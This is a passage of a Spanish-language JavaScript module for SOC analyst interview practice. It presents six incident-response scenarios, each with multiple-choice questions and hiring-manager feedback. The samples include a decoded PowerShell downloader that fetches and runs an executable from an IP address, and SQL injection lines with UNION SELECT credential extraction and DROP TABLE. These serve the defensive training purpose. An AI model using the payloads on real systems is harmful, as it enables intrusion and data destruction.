/* ============================================================================
   MÓDULO: Interview Prep - Casos Reales de Entrevista 2026
   Basado en investigación de fuentes reales: TryHackMe SOC Interview Guide 2026,
   KORE1 hiring managers, LetsDefend, Microsoft IR Playbooks, SIEM XPERT.

   6 casos + STAR framework + behavioral questions.
   Formato: escenario → elige respuesta → feedback con razonamiento del hiring manager.
============================================================================ */

const initEnv = () => ({
    current_case: null,
    cases_completed: [],
    cases_passed: [],
    score: 0,
    // Cada caso es un assessment real que se hace en SOC L1 interviews
    cases: {
        phishing: { title: 'Phishing Alert Investigation', difficulty: 'L1', completed: false },
        bruteforce: { title: 'Brute Force + Login Sospechoso', difficulty: 'L1', completed: false },
        malware: { title: 'Endpoint con PowerShell Sospechoso', difficulty: 'L2', completed: false },
        exfil: { title: 'Posible Exfiltración de Datos', difficulty: 'L2', completed: false },
        webattack: { title: 'SQL Injection en Logs Web', difficulty: 'L1', completed: false },
        insider: { title: 'Insider Threat - Privilege Abuse', difficulty: 'L2', completed: false }
    }
})

// ─── DEFINICIÓN DE CASOS ────────────────────────────────────────────────────
const CASES = {
    // ============ CASO 1: PHISHING (el más común en entrevistas) ============
    phishing: {
        intro: [
            '═══════════════════════════════════════════════════════════',
            '  CASO 1: PHISHING ALERT INVESTIGATION (Dificultad: L1)',
            '═══════════════════════════════════════════════════════════',
            '',
            'ESCENARIO (Hiring Manager te dice):',
            '',
            '  "Es lunes 9:15 AM. Recibes una alerta de tu SIEM (Splunk):',
            '',
            '   Alert: Suspicious email detected',
            '   From: it-support@acrne-corp.com  (typo de acme-corp.com)',
            '   To: 47 empleados en finance@acme-corp.com',
            '   Subject: URGENT: Reset your password now',
            '   Link: http://acrne-corp[.]com/reset-password',
            '   Attachment: password_reset_instructions.docx (28 KB)',
            '',
            '   Walk me through cómo investigarías esto. Paso a paso."',
            '',
            '─────────────────────────────────────────────────────────────',
            'PRIMERA PREGUNTA: ¿Cuál es tu primera acción?',
            '',
            '  1) Bloqueo el dominio inmediatamente en el firewall',
            '  2) Valido si la alerta es real (verificar el dominio)',
            '  3) Reseteo las contraseñas de los 47 usuarios',
            '  4) Escalo a Tier-2 sin hacer nada',
            '',
            'Responde con: answer 1, answer 2, answer 3, o answer 4'
        ],
        questions: [
            {
                // Q1
                correct: 2,
                feedback_correct: [
                    '✅ CORRECTO. Respuesta esperada por el hiring manager.',
                    '',
                    'EXPLICACIÓN:',
                    'La regla #1 en SOC es VERIFICAR antes de ACTUAR. Si bloqueas el dominio',
                    'sin verificar, podrías estar bloqueando legítimo o creando un falso',
                    'positivo. Si reseteas 47 passwords sin verificar, alarmas a la empresa',
                    'sin razón.',
                    '',
                    'Pasos correctos en orden:',
                    '  1. Verificar headers del email (SPF, DKIM, DMARC)',
                    '  2. Verificar el dominio (WHOIS, registro reciente?)',
                    '  3. Verificar reputación (VirusTotal, URLScan)',
                    '  4. Detonar el .docx en sandbox',
                    '  5. Buscar quién clickeó / abrió en logs',
                    '  6. SOLO ENTONCES tomar acciones'
                ],
                feedback_wrong: {
                    1: ['❌ INCORRECTO. Bloquear sin verificar = riesgo de bloquear legítimo + altera la investigación. Primero VALIDAS, luego actúas.'],
                    3: ['❌ INCORRECTO. Resetear 47 passwords sin verificar genera caos. Solo lo haces si CONFIRMAS compromiso.'],
                    4: ['❌ INCORRECTO. Como L1, tu trabajo es investigar primero. Escalar sin info = inútil.']
                }
            },
            {
                // Q2
                prompt: [
                    '─────────────────────────────────────────────────────────────',
                    'SEGUNDA PREGUNTA: Ya verificaste que el email es phishing real.',
                    'En logs ves que 3 usuarios CLICKEARON el link y 1 INGRESÓ credenciales.',
                    '',
                    '¿Cuál es tu próxima acción más crítica?',
                    '',
                    '  1) Notificar a los 47 receptores que ignoren el email',
                    '  2) Reset password del usuario que ingresó credenciales + revisar logins',
                    '  3) Bloquear el dominio en email gateway + DNS',
                    '  4) Documentar el incidente para el reporte'
                ],
                correct: 2,
                feedback_correct: [
                    '✅ CORRECTO.',
                    '',
                    'EXPLICACIÓN:',
                    'El usuario que ingresó credenciales = compromiso confirmado.',
                    'Prioridad: contener el daño YA. Pasos:',
                    '  1. Reset password forzado del usuario afectado',
                    '  2. Revocar todas las sesiones activas (Azure AD/Okta)',
                    '  3. Revisar logs: ¿Hubo logins desde IPs raras después del phish?',
                    '  4. Revisar MFA: ¿bypassed? ¿attacker registró su propio MFA?',
                    '',
                    'DESPUÉS haces lo demás (bloquear dominio, notificar usuarios, doc).',
                    'El orden es: CONTAIN > ERADICATE > NOTIFY > DOCUMENT'
                ],
                feedback_wrong: {
                    1: ['❌ INCORRECTO. Notificar es importante pero NO es lo más crítico. Si el atacante ya tiene credenciales, cada segundo cuenta.'],
                    3: ['❌ ACEPTABLE pero NO óptimo. Bloquear el dominio es bueno, pero el atacante YA TIENE las credenciales. El reset es prioridad.'],
                    4: ['❌ INCORRECTO. Documentar es importante pero NO es la primera acción cuando hay compromiso activo.']
                }
            },
            {
                // Q3 - pregunta conceptual final
                prompt: [
                    '─────────────────────────────────────────────────────────────',
                    'TERCERA PREGUNTA (conceptual):',
                    '',
                    'El hiring manager pregunta: "¿Cómo sabrías si el atacante usó',
                    'las credenciales para algo MÁS DESPUÉS del login inicial?"',
                    '',
                    '  1) Reviso solo el log de logins',
                    '  2) Reviso logs de Authentication + Mailbox + SharePoint + Network',
                    '  3) Reinstalo el sistema operativo del usuario',
                    '  4) Le pregunto al usuario qué hizo'
                ],
                correct: 2,
                feedback_correct: [
                    '✅ CORRECTO.',
                    '',
                    'EXPLICACIÓN (esto te diferencia de un L1 promedio):',
                    'Un atacante con credenciales puede:',
                    '  - Leer/forwardear emails (Mailbox rules sospechosas)',
                    '  - Descargar archivos de SharePoint/OneDrive',
                    '  - Crear inbox rules para ocultar respuestas (BEC clásico)',
                    '  - Conectarse desde IPs sospechosas',
                    '  - Registrar nuevos métodos MFA (persistence)',
                    '',
                    'CORRELACIÓN entre logs = lo que separa L1 de L2.',
                    'Esto es Pivoting Investigation, técnica clave para hiring manager.'
                ],
                feedback_wrong: {
                    1: ['❌ INCOMPLETO. Solo logins no te dice qué hizo el atacante DESPUÉS. Necesitas correlación.'],
                    3: ['❌ INCORRECTO Y PELIGROSO. Reinstalar destruye evidencia forense. Nunca primero.'],
                    4: ['❌ INCORRECTO. El usuario probablemente no recuerda o miente por miedo. Logs no mienten.']
                }
            }
        ],
        final: [
            '═══════════════════════════════════════════════════════════',
            '🎯 CASO COMPLETADO: PHISHING INVESTIGATION',
            '═══════════════════════════════════════════════════════════',
            '',
            'KEY TAKEAWAYS para tu entrevista real:',
            '',
            '1. ORDEN: Verify → Validate → Contain → Eradicate → Document',
            '2. Nunca actúes sin verificar (bloquear, resetear, etc.)',
            '3. Cuando hay compromiso → priorizas CONTAINMENT inmediato',
            '4. Investigación = CORRELACIÓN entre múltiples logs',
            '5. Después del login → buscar persistence (mailbox rules, MFA, etc.)',
            '',
            'FRASE GANADORA EN ENTREVISTA:',
            '"My first step is always validation, not action. False positives',
            'cost trust; reactive actions without evidence cost more."',
            ''
        ]
    },

    // ============ CASO 2: BRUTE FORCE + LOGIN SOSPECHOSO ============
    bruteforce: {
        intro: [
            '═══════════════════════════════════════════════════════════',
            '  CASO 2: BRUTE FORCE + LOGIN DESDE UBICACIÓN RARA (L1)',
            '═══════════════════════════════════════════════════════════',
            '',
            'ESCENARIO:',
            '',
            '  "Es martes 11:30 PM (fuera de horario). Tu SIEM dispara:',
            '',
            '   Alert: Brute force followed by successful login',
            '   User: m.garcia@acme-corp.com (CFO)',
            '   Failed attempts: 47 from 185.220.101.42 (Tor exit node)',
            '   Successful login: from 185.220.101.42 at 23:42',
            '   Geo: Russia',
            '   Last legitimate login: 18:00 from Mexico City (oficina)',
            '',
            '   ¿Qué haces?"',
            '',
            '─────────────────────────────────────────────────────────────',
            'PRIMERA PREGUNTA: ¿Cuál es tu acción INMEDIATA?',
            '',
            '  1) Llamar al CFO a las 11:30 PM para preguntar si fue él',
            '  2) Bloquear cuenta + revocar sesiones + forzar reset',
            '  3) Esperar a horario laboral para investigar',
            '  4) Solo monitorear más actividad'
        ],
        questions: [
            {
                correct: 2,
                feedback_correct: [
                    '✅ CORRECTO.',
                    '',
                    'EXPLICACIÓN:',
                    'Indicadores que GRITAN compromiso confirmado:',
                    '  ✓ Tor exit node = ofuscación deliberada',
                    '  ✓ Geo Russia vs último login Mexico = imposible viajar',
                    '  ✓ Fuera de horario',
                    '  ✓ Brute force seguido de éxito = password cracked o stuffing',
                    '',
                    'No es momento de "investigar más". Es momento de CONTENER.',
                    'Las acciones inmediatas son:',
                    '  1. Disable account (Azure AD / Okta)',
                    '  2. Revoke all active sessions',
                    '  3. Force password reset',
                    '  4. Habilitar MFA si no estaba',
                    '  5. LUEGO investigar qué hizo en la sesión'
                ],
                feedback_wrong: {
                    1: ['❌ INCORRECTO. Para cuando despierte al CFO, el atacante ya tuvo 1 hora extra. CONTÉN primero, llama después.'],
                    3: ['❌ MUY INCORRECTO. Esperar = más tiempo al atacante. Esto te descalifica en entrevista.'],
                    4: ['❌ INCORRECTO. "Monitorear" cuando hay compromiso confirmado = mala práctica. Actúa.']
                }
            },
            {
                prompt: [
                    '─────────────────────────────────────────────────────────────',
                    'SEGUNDA PREGUNTA:',
                    'Contuviste la cuenta. Ahora el hiring manager pregunta:',
                    '',
                    '"¿Cómo determinarías si el atacante hizo algo importante',
                    'durante esos minutos que tuvo acceso?"',
                    '',
                    '  1) Reviso solo el log de Azure AD',
                    '  2) Reviso Azure AD + correo + SharePoint + cualquier app que el CFO use',
                    '  3) Reinicio todo el dominio',
                    '  4) Le pido al CFO un screenshot de su pantalla'
                ],
                correct: 2,
                feedback_correct: [
                    '✅ CORRECTO.',
                    '',
                    'EXPLICACIÓN:',
                    'CFO = high-value target. Posibles acciones del atacante:',
                    '  - Descargar reportes financieros (SharePoint, OneDrive)',
                    '  - Crear mailbox rules para forwardear correos (BEC clásico)',
                    '  - Cambiar info bancaria de vendors (wire fraud)',
                    '  - Crear delegaciones en Outlook',
                    '  - Registrar nuevo método de MFA (persistence)',
                    '  - Descargar contactos de empleados',
                    '',
                    'Los logs CORRELACIONADOS te dicen la story completa.'
                ],
                feedback_wrong: {
                    1: ['❌ INCOMPLETO. Solo Azure AD te dice "logged in" pero NO qué hizo después.'],
                    3: ['❌ INCORRECTO Y CARO. Reiniciar dominio = downtime masivo. Solo en último recurso.'],
                    4: ['❌ INCORRECTO. Logs te dicen la verdad, el usuario no sabe qué pasó.']
                }
            }
        ],
        final: [
            '═══════════════════════════════════════════════════════════',
            '🎯 CASO COMPLETADO: BRUTE FORCE + ACCOUNT TAKEOVER',
            '═══════════════════════════════════════════════════════════',
            '',
            'KEY TAKEAWAYS:',
            '',
            '1. Tor + Geo anómalo + fuera de horario = ACCIÓN INMEDIATA',
            '2. Containment FIRST: disable → revoke sessions → reset',
            '3. Investigación POST-containment: ¿qué hizo el atacante?',
            '4. Targets ejecutivos = BEC (Business Email Compromise) probable',
            '5. Mailbox rules sospechosas = persistence clásica',
            '',
            'FRASE GANADORA:',
            '"When indicators of compromise are this strong, hesitation is',
            'risk. I contain first, then investigate the full scope."'
        ]
    },

    // ============ CASO 3: ENDPOINT CON POWERSHELL SOSPECHOSO ============
    malware: {
        intro: [
            '═══════════════════════════════════════════════════════════',
            '  CASO 3: POWERSHELL OBFUSCATED EN ENDPOINT (L2)',
            '═══════════════════════════════════════════════════════════',
            '',
            'ESCENARIO:',
            '',
            '  Alert: Suspicious PowerShell execution',
            '  Host: WORKSTATION-47 (user: j.rodriguez, Marketing)',
            '  Command: powershell -enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGo...',
            '  Parent process: WINWORD.EXE',
            '  Network: connection to 185.107.56.21:443',
            '',
            '─────────────────────────────────────────────────────────────',
            'PRIMERA PREGUNTA: ¿Qué te dicen estos indicadores?',
            '',
            '  1) Es normal, marketing usa PowerShell',
            '  2) WINWORD spawneando PowerShell encoded = malware probable',
            '  3) Solo es Excel haciendo cálculos',
            '  4) Necesito más logs antes de opinar'
        ],
        questions: [
            {
                correct: 2,
                feedback_correct: [
                    '✅ CORRECTO.',
                    '',
                    'EXPLICACIÓN:',
                    'Esto es un patrón CLÁSICO de Initial Access via Phishing:',
                    '  - Word document con macro maliciosa',
                    '  - Macro spawnea PowerShell con -enc (Base64 encoded)',
                    '  - PowerShell decoded probablemente descarga payload',
                    '  - Connection a IP rara en :443 = C2 channel',
                    '',
                    'Esto está mapeado a MITRE ATT&CK:',
                    '  T1566.001 - Phishing: Spearphishing Attachment',
                    '  T1059.001 - Command and Scripting: PowerShell',
                    '  T1140 - Deobfuscate/Decode Files',
                    '  T1071.001 - Application Layer Protocol: Web (C2)'
                ],
                feedback_wrong: {
                    1: ['❌ INCORRECTO. Marketing NO usa PowerShell. Y CIERTAMENTE no encoded.'],
                    3: ['❌ INCORRECTO. WINWORD ≠ Excel. El log dice WINWORD.'],
                    4: ['❌ ACEPTABLE pero los indicadores son SUFICIENTES para sospechar fuertemente. No demores.']
                }
            },
            {
                prompt: [
                    '─────────────────────────────────────────────────────────────',
                    'SEGUNDA PREGUNTA: ¿Cuál es tu primera acción?',
                    '',
                    '  1) Apagar la máquina inmediatamente',
                    '  2) Aislar el host de la red (network isolation via EDR)',
                    '  3) Notificar al usuario que reinicie',
                    '  4) Solo bloquear la IP 185.107.56.21'
                ],
                correct: 2,
                feedback_correct: [
                    '✅ CORRECTO.',
                    '',
                    'EXPLICACIÓN:',
                    'Network isolation > shutdown porque:',
                    '  ✓ Preserva la RAM (evidencia forense crítica)',
                    '  ✓ Preserva procesos activos para análisis',
                    '  ✓ Corta C2 pero mantiene el host vivo',
                    '  ✓ Permite análisis subsecuente',
                    '',
                    'EDR moderno (CrowdStrike, SentinelOne, Defender) tiene botón:',
                    '"Contain Host" o "Network Isolation" - lo aísla en segundos.',
                    '',
                    'NUNCA apagues:',
                    '  ✗ Pierdes evidencia en RAM (passwords, keys, malware decifrado)',
                    '  ✗ Triggereas mecanismos de auto-destrucción del malware'
                ],
                feedback_wrong: {
                    1: ['❌ INCORRECTO. Apagar destruye evidencia forense en RAM. NUNCA primero.'],
                    3: ['❌ INCORRECTO. Reiniciar = pierdes RAM. Mismo problema que apagar.'],
                    4: ['❌ INCOMPLETO. Bloquear la IP es bueno pero el malware podría reconectar a otras IPs. Aislar el host es más efectivo.']
                }
            },
            {
                prompt: [
                    '─────────────────────────────────────────────────────────────',
                    'TERCERA PREGUNTA (técnica):',
                    'Decodificas el Base64 del PowerShell y ves esto:',
                    '',
                    '  $client = New-Object Net.WebClient',
                    '  $client.DownloadFile("http://185.107.56.21/stage2.exe", "$env:TEMP\\update.exe")',
                    '  Start-Process "$env:TEMP\\update.exe"',
                    '',
                    '¿Qué hace este código?',
                    '',
                    '  1) Es un actualizador legítimo de Windows',
                    '  2) Descarga stage2.exe del C2 y lo ejecuta (downloader/dropper)',
                    '  3) Es un script de respaldo',
                    '  4) No estoy seguro'
                ],
                correct: 2,
                feedback_correct: [
                    '✅ CORRECTO.',
                    '',
                    'EXPLICACIÓN:',
                    'Este es un downloader/dropper clásico:',
                    '  1. Crea cliente HTTP',
                    '  2. Descarga "update.exe" del attacker C2',
                    '  3. Lo ejecuta (probablemente RAT, ransomware, o backdoor)',
                    '',
                    'IMPACTO POTENCIAL:',
                    '  - Si stage2.exe se ejecutó → host comprometido',
                    '  - Lateral movement probable a otros hosts',
                    '  - Hay que verificar: ¿stage2.exe existe? ¿se ejecutó?',
                    '  - ¿Hay persistencia (Run keys, scheduled tasks, services)?',
                    '',
                    'Esto es lo que un L2 hace: NO solo bloquear la alerta, sino',
                    'entender el ATTACK CHAIN COMPLETO.'
                ],
                feedback_wrong: {
                    1: ['❌ INCORRECTO. Windows Update NO usa PowerShell encoded de un Word document. Esto es malware.'],
                    3: ['❌ INCORRECTO. Los backups no descargan .exe de IPs rusas.'],
                    4: ['❌ MEJOR responde algo en entrevista. "No sé" sin esfuerzo te elimina. Razona en voz alta.']
                }
            }
        ],
        final: [
            '═══════════════════════════════════════════════════════════',
            '🎯 CASO COMPLETADO: POWERSHELL MALWARE',
            '═══════════════════════════════════════════════════════════',
            '',
            'KEY TAKEAWAYS:',
            '',
            '1. WINWORD/EXCEL → PowerShell = bandera roja siempre',
            '2. -enc en PowerShell = ofuscación = sospecha',
            '3. Network Isolation > Shutdown (preserva evidencia)',
            '4. Decodifica Base64 ANTES de declarar conclusiones',
            '5. Piensa en KILL CHAIN, no solo en alerta única',
            '6. Conecta con MITRE ATT&CK techniques',
            '',
            'FRASE GANADORA:',
            '"I isolate first to preserve forensic evidence, then decode',
            'and trace the full attack chain through MITRE ATT&CK."'
        ]
    },

    // ============ CASO 4: DATA EXFILTRATION ============
    exfil: {
        intro: [
            '═══════════════════════════════════════════════════════════',
            '  CASO 4: POSIBLE EXFILTRACIÓN DE DATOS (L2)',
            '═══════════════════════════════════════════════════════════',
            '',
            'ESCENARIO:',
            '',
            '  Alert: Unusual data transfer detected',
            '  User: a.lopez (Software Engineer)',
            '  Action: Downloaded 2.3 GB from corporate SharePoint',
            '  Time: Sunday 3:14 AM',
            '  Files: customer_database_export.xlsx, source_code_v3.zip,',
            '         project_alpha_specs.pdf, ...',
            '  Destination: uploaded to personal Dropbox account',
            '  Note: User submitted resignation 2 days ago',
            '',
            '─────────────────────────────────────────────────────────────',
            'PRIMERA PREGUNTA: ¿Qué tipo de amenaza es esto?',
            '',
            '  1) External attacker (cuenta hackeada)',
            '  2) Insider threat - exfiltración por empleado saliente',
            '  3) Backup legítimo del empleado',
            '  4) Falso positivo, ignorar'
        ],
        questions: [
            {
                correct: 2,
                feedback_correct: [
                    '✅ CORRECTO.',
                    '',
                    'EXPLICACIÓN:',
                    'Indicadores CLAROS de insider threat:',
                    '  ✓ Empleado renunció hace 2 días',
                    '  ✓ Acceso fuera de horario (3 AM domingo)',
                    '  ✓ Datos sensibles (DB clientes, código fuente, specs)',
                    '  ✓ Destino externo (Dropbox personal)',
                    '  ✓ Volumen alto (2.3 GB no es accidente)',
                    '',
                    'Esto es Insider Threat textbook:',
                    '  - Empleado saliente preparando "competencia"',
                    '  - O vendiendo datos a competencia',
                    '  - O preparando lawsuit con evidencia',
                    '',
                    'MITRE ATT&CK: T1567.002 - Exfiltration to Cloud Storage'
                ],
                feedback_wrong: {
                    1: ['❌ POSIBLE pero menos probable. La cuenta podría estar hackeada, pero el timing (post-renuncia) sugiere insider.'],
                    3: ['❌ INCORRECTO. "Backups" personales de datos corporativos = violación de política. Y "código fuente" no es backup personal legítimo.'],
                    4: ['❌ MUY INCORRECTO. 2.3 GB de datos sensibles a Dropbox personal NO es FP. Esto te descalifica.']
                }
            },
            {
                prompt: [
                    '─────────────────────────────────────────────────────────────',
                    'SEGUNDA PREGUNTA: ¿Cuál es tu primera acción?',
                    '',
                    '  1) Confrontar al empleado directamente',
                    '  2) Disable account + preservar evidencia + notificar Legal/HR',
                    '  3) Solo borrar los archivos del Dropbox',
                    '  4) Llamar a la policía'
                ],
                correct: 2,
                feedback_correct: [
                    '✅ CORRECTO.',
                    '',
                    'EXPLICACIÓN:',
                    'Insider threats requieren coordinación:',
                    '  1. Disable account inmediatamente (corta acceso futuro)',
                    '  2. PRESERVAR EVIDENCIA (logs, timestamps, hashes)',
                    '  3. Notificar Legal y HR (no confrontes solo)',
                    '  4. Documentar timeline detallado',
                    '  5. Forensics en la laptop si el empleado aún la tiene',
                    '',
                    'Por qué NO confrontar:',
                    '  - Empleado puede destruir evidencia',
                    '  - Implicaciones legales si lo haces mal',
                    '  - HR/Legal manejan terminación con causa',
                    '',
                    'Por qué NO llamar policía aún:',
                    '  - Primero confirmar EXTENT del daño',
                    '  - Legal decide si presentar cargos',
                    '  - Tienes que tener case sólido primero'
                ],
                feedback_wrong: {
                    1: ['❌ INCORRECTO. Confrontación destruye evidencia y tiene implicaciones legales. Coordinar con HR/Legal primero.'],
                    3: ['❌ MUY INCORRECTO. Borrar archivos = destruir evidencia. Y los datos YA están en posesión del empleado.'],
                    4: ['❌ PREMATURO. Necesitas confirmar el alcance primero. Legal decide cuándo involucrar autoridades.']
                }
            }
        ],
        final: [
            '═══════════════════════════════════════════════════════════',
            '🎯 CASO COMPLETADO: INSIDER THREAT / EXFIL',
            '═══════════════════════════════════════════════════════════',
            '',
            'KEY TAKEAWAYS:',
            '',
            '1. Empleados salientes = HIGH RISK insider threat window',
            '2. DLP alerts + timing = patrón clásico',
            '3. NUNCA confrontes solo - involucra HR + Legal',
            '4. Preservar evidencia > acciones rápidas',
            '5. Documentar TODO con timestamps (cadena de custodia)',
            '6. Tools: DLP (Microsoft Purview, Forcepoint), UEBA',
            '',
            'FRASE GANADORA:',
            '"Insider threats need coordination, not confrontation. I',
            'preserve evidence and engage Legal/HR before any action that',
            'could compromise the case."'
        ]
    },

    // ============ CASO 5: SQL INJECTION EN LOGS ============
    webattack: {
        intro: [
            '═══════════════════════════════════════════════════════════',
            '  CASO 5: SQL INJECTION EN LOGS DEL WEB SERVER (L1)',
            '═══════════════════════════════════════════════════════════',
            '',
            'ESCENARIO:',
            '',
            '  Tu SIEM (Splunk) muestra estos eventos en web-prod-01:',
            '',
            '  10:23:01  GET /products?id=1 → 200 OK',
            '  10:23:14  GET /products?id=1\' → 500 Internal Server Error',
            '  10:23:28  GET /products?id=1\' OR \'1\'=\'1 → 200 OK (size: 458KB)',
            '  10:23:42  GET /products?id=1 UNION SELECT username,password... → 200 OK',
            '  10:23:58  GET /products?id=1; DROP TABLE users; -- → 200 OK',
            '',
            '  Source IP: 92.118.39.55 (foreign)',
            '',
            '─────────────────────────────────────────────────────────────',
            'PRIMERA PREGUNTA: ¿Qué está pasando aquí?',
            '',
            '  1) Usuario legítimo navegando productos',
            '  2) SQL Injection attack en progreso, posible exfil de credenciales',
            '  3) Bug en la aplicación',
            '  4) Web scraper'
        ],
        questions: [
            {
                correct: 2,
                feedback_correct: [
                    '✅ CORRECTO.',
                    '',
                    'EXPLICACIÓN:',
                    'La progresión clásica de SQLi:',
                    '  1. GET ?id=1\' → tester pone comilla simple → 500 error',
                    '     ↳ Confirma que es injectable (error revela engine SQL)',
                    '  2. GET ?id=1\' OR \'1\'=\'1 → bypass clásico → 200 OK con MÁS data',
                    '     ↳ Retorna 458KB = devuelve TODA la tabla',
                    '  3. UNION SELECT username,password → exfil de credenciales',
                    '  4. DROP TABLE → intento de destrucción',
                    '',
                    'Esto está en MITRE ATT&CK:',
                    '  T1190 - Exploit Public-Facing Application',
                    '  T1213 - Data from Information Repositories'
                ],
                feedback_wrong: {
                    1: ['❌ INCORRECTO. Usuarios legítimos no escriben UNION SELECT.'],
                    3: ['❌ INCORRECTO. No es bug; es explotación deliberada del bug por un atacante.'],
                    4: ['❌ INCORRECTO. Scrapers no usan SQL syntax en URLs.']
                }
            },
            {
                prompt: [
                    '─────────────────────────────────────────────────────────────',
                    'SEGUNDA PREGUNTA: ¿Cuál es tu primera acción?',
                    '',
                    '  1) Solo bloquear la IP 92.118.39.55 en firewall',
                    '  2) Bloquear IP + verificar si el UNION SELECT exfiltró data + notificar AppSec',
                    '  3) Esperar para ver si vuelve',
                    '  4) Apagar el web server'
                ],
                correct: 2,
                feedback_correct: [
                    '✅ CORRECTO.',
                    '',
                    'EXPLICACIÓN:',
                    'Bloquear IP es solo el principio. Necesitas:',
                    '  1. Bloquear IP en WAF/firewall (containment inmediato)',
                    '  2. Analizar response del UNION SELECT (¿qué columnas retornó?)',
                    '  3. Verificar si la tabla users fue dropped',
                    '  4. Backup database si no se ejecutó el DROP',
                    '  5. Notificar a desarrollo/AppSec (FIX el código)',
                    '  6. Buscar OTROS endpoints vulnerables (lateral)',
                    '  7. Revisar OTROS hosts: ¿la misma IP atacó más?',
                    '',
                    'Bonus que impresiona al hiring manager:',
                    '"El bug está en el código. Bloquear IPs es band-aid. El fix real',
                    'es prepared statements / ORM en la app."'
                ],
                feedback_wrong: {
                    1: ['❌ INCOMPLETO. Bloquear IP es bien pero el atacante ya puede haber exfiltrado credenciales. Investiga el daño.'],
                    3: ['❌ MUY INCORRECTO. "Esperar" cuando ya hubo DROP TABLE intento = inaceptable.'],
                    4: ['❌ EXTREMO. Apagar el server afecta el negocio. Bloquear IP + WAF rule es proporcional.']
                }
            }
        ],
        final: [
            '═══════════════════════════════════════════════════════════',
            '🎯 CASO COMPLETADO: SQL INJECTION',
            '═══════════════════════════════════════════════════════════',
            '',
            'KEY TAKEAWAYS:',
            '',
            '1. Reconocer SQLi patterns: \', OR 1=1, UNION SELECT, DROP TABLE',
            '2. Progresión típica: probe → bypass → exfil → destroy',
            '3. Respuesta: containment IP + WAF + verificar daño + notify dev',
            '4. Fix real = código (prepared statements), no firewall',
            '5. Pivot: ¿la misma IP atacó otros endpoints/sistemas?',
            '6. OWASP A03:2021 - Injection sigue siendo top 3',
            '',
            'FRASE GANADORA:',
            '"Blocking the IP buys time, but the real vulnerability is in the',
            'code. I coordinate immediate containment AND long-term fix."'
        ]
    },

    // ============ CASO 6: INSIDER PRIVILEGE ABUSE ============
    insider: {
        intro: [
            '═══════════════════════════════════════════════════════════',
            '  CASO 6: ABUSO DE PRIVILEGIOS - ADMIN SOSPECHOSO (L2)',
            '═══════════════════════════════════════════════════════════',
            '',
            'ESCENARIO:',
            '',
            '  Alert: Privileged user behavior anomaly',
            '  User: admin@acme-corp.com (IT Admin: r.fernandez)',
            '  Actions detected en últimas 24h:',
            '   - 03:00 AM: Reset password de CFO',
            '   - 03:02 AM: Login con la nueva password como CFO',
            '   - 03:05 AM: Lectura de Mailbox del CFO',
            '   - 03:30 AM: Descargó financial reports de SharePoint',
            '   - 03:45 AM: Reset password del CFO de vuelta a algo random',
            '   - 04:00 AM: Logged out',
            '  No tickets asociados a esta actividad.',
            '',
            '─────────────────────────────────────────────────────────────',
            'PRIMERA PREGUNTA: ¿Qué es esto?',
            '',
            '  1) Mantenimiento legítimo de IT',
            '  2) Account takeover del admin',
            '  3) Insider abuse - admin espiando ejecutivos',
            '  4) Falso positivo'
        ],
        questions: [
            {
                correct: 3,
                feedback_correct: [
                    '✅ CORRECTO. (Aunque #2 también es posible - veamos por qué.)',
                    '',
                    'EXPLICACIÓN:',
                    'Indicadores de insider abuse:',
                    '  ✓ Sin ticket asociado (mantenimiento legítimo SIEMPRE tiene ticket)',
                    '  ✓ Reset password del CFO sin solicitud',
                    '  ✓ Login como CFO (impersonación)',
                    '  ✓ Leyó emails personales del CFO',
                    '  ✓ Descargó docs financieros',
                    '  ✓ Reset password de vuelta (cover tracks)',
                    '  ✓ 3 AM (fuera de horario, sin justificación)',
                    '',
                    'Esto se llama Account Manipulation + Impersonation.',
                    'MITRE: T1098 - Account Manipulation, T1078 - Valid Accounts',
                    '',
                    '⚠ También considerar: ¿admin comprometido? Esto requeriría que',
                    'su cuenta haya sido tomada. Investigación posterior debe descartar esto.'
                ],
                feedback_wrong: {
                    1: ['❌ INCORRECTO. Mantenimiento legítimo NUNCA es a las 3 AM sin ticket, sin justificación, y leyendo emails personales.'],
                    2: ['⚠ PARCIAL. Es posible pero menos probable. Si fuera takeover, esperaríamos también acciones más amplias (no solo CFO). Pero NO descartes esto en tu investigación.'],
                    4: ['❌ MUY INCORRECTO. Reset password sin ticket = trigger automático de investigación.']
                }
            },
            {
                prompt: [
                    '─────────────────────────────────────────────────────────────',
                    'SEGUNDA PREGUNTA: ¿Cuál es tu acción?',
                    '',
                    '  1) Confrontar al admin directamente',
                    '  2) Disable admin account + preservar evidencia + escalar a CISO + HR + Legal',
                    '  3) Solo monitorear más',
                    '  4) Resetear los privilegios del admin sin avisar'
                ],
                correct: 2,
                feedback_correct: [
                    '✅ CORRECTO.',
                    '',
                    'EXPLICACIÓN:',
                    'Insider con privilegios = caso ALTAMENTE SENSIBLE:',
                    '  1. Disable admin account YA (corta acceso futuro)',
                    '  2. Revoke sessions, API tokens, certificados',
                    '  3. PRESERVAR todo: logs, screenshots, hashes',
                    '  4. Escalar inmediato: CISO, HR Director, General Counsel',
                    '  5. NO comunicar al admin todavía',
                    '  6. Forensics en su workstation',
                    '  7. Audit completo de sus actividades últimos 6 meses',
                    '',
                    'Por qué tan formal:',
                    '  - Implicaciones legales (es empleado privilegiado)',
                    '  - Posible despido con causa requiere evidencia sólida',
                    '  - Si vendió data → litigio',
                    '  - Si copy a competencia → IP theft',
                    '',
                    'Esto NO es L1 work, pero saberlo te diferencia.'
                ],
                feedback_wrong: {
                    1: ['❌ INCORRECTO Y PELIGROSO. Confrontar = puede destruir evidencia, alertar al admin que cubra rastros más.'],
                    3: ['❌ INCORRECTO. "Monitorear" mientras un admin abusa privilegios = negligencia.'],
                    4: ['❌ INSUFICIENTE. Solo bajar privilegios no preserva evidencia para futuras acciones legales.']
                }
            }
        ],
        final: [
            '═══════════════════════════════════════════════════════════',
            '🎯 CASO COMPLETADO: INSIDER PRIVILEGE ABUSE',
            '═══════════════════════════════════════════════════════════',
            '',
            'KEY TAKEAWAYS:',
            '',
            '1. Acciones sin tickets = bandera roja para usuarios privilegiados',
            '2. Patrón reset → impersonate → reset = cover tracks clásico',
            '3. NO confrontes solo a admins - involucra CISO + HR + Legal',
            '4. UEBA (User Entity Behavior Analytics) detecta esto',
            '5. PAM (Privileged Access Management) previene esto',
            '6. Considera SIEMPRE: ¿abuse o cuenta comprometida?',
            '',
            'FRASE GANADORA:',
            '"Privileged user incidents need formal escalation, not field',
            'investigation. I preserve, escalate, and let process protect',
            'both the company and the investigation integrity."'
        ]
    }
}

// ─── COMANDOS ────────────────────────────────────────────────────────────────
const commands = {
    'cases': (args, env) => {
        const out = [
            '═══════════════════════════════════════════════════════',
